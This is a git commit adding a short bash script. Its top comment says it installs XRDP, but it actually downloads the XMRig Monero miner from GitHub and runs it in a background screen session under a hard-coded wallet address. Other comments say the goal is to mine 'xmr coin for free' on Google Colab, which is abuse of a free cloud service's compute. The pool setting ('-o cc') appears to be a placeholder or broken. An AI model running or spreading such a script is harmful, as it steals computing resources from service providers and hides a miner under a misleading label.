86dfd85935e69a686c711a2fd38aeb829966fd31
bliptaz <66195749+bliptaz@users.noreply.github.com>
2022-03-18 23:07:22 +0700

    Create go9.sh

---
+++ go9.sh
@@ -0,0 +1,13 @@
+#! /bin/bash
+# Install XRDP
+# Before get xmr coin for free
+# Google Colab
+sudo apt update
+clear
+sudo apt install screen
+screen -R xmr
+ 
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
+tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
+cd xmrig-6.16.4
+./xmrig -o cc -u 3JAjhFSGD1Jr5mjumCCbr32KmD8rp3Ctg8.go9 -p x -k --nicehash -a rx/0
